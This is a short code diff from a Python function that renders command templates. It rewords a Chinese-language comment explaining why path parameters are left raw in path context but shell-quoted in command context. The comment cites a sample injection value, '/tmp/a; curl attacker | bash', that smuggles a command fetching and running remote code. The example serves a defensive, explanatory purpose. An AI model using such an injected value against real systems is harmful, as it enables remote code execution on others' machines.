@@ -98,7 +98,7 @@ def build_command_from_template(template: dict[str, Any], server: dict[str, Any]
         if validation == "trusted_shell_fragment":
             resolved[name] = value
         elif name == "workspace" or spec.get("type") == "path":
-            # 路径参数双上下文渲染(评审 P2):路径上下文(validate_workspace
+            # 路径参数需要双上下文渲染：路径上下文(validate_workspace
             # 的拼接)需要裸值;但 command/init command 是 shell 上下文,
             # 同一值必须 quote——否则模板把 {output_path} 写进 command 时,
             # "/tmp/a; curl attacker | bash" 会以元字符裸进 bash -lc/
